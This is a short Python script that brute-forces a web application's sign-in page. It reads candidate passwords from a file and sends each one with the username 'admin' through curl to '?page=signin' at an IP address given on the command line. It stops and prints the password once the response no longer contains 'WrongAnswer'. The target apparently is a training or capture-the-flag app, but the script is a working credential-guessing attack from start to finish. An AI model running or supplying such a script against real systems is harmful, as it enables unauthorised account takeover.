import subprocess
import sys


if len(sys.argv ) == 2:
    url = f"http://{sys.argv[1]}/?page=signin"
else:
    print("Error: please set the IP address in the script parameter")
    exit(1)

username = "admin"

with open("passwords.txt", "r") as f:
    for pwd in f:
        pwd = pwd.strip()

        cmd = [
            "curl", "-s",
            f"{url}&username={username}&password={pwd}&Login=Login#"
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout

        print(f"[ ] Test : {pwd}")

        if "WrongAnswer" not in output:
            print("\n=== PASSWORD FOUND ===")
            print(f"username = {username}")
            print(f"password = {pwd}")
            break
    else:
        print("No password found")
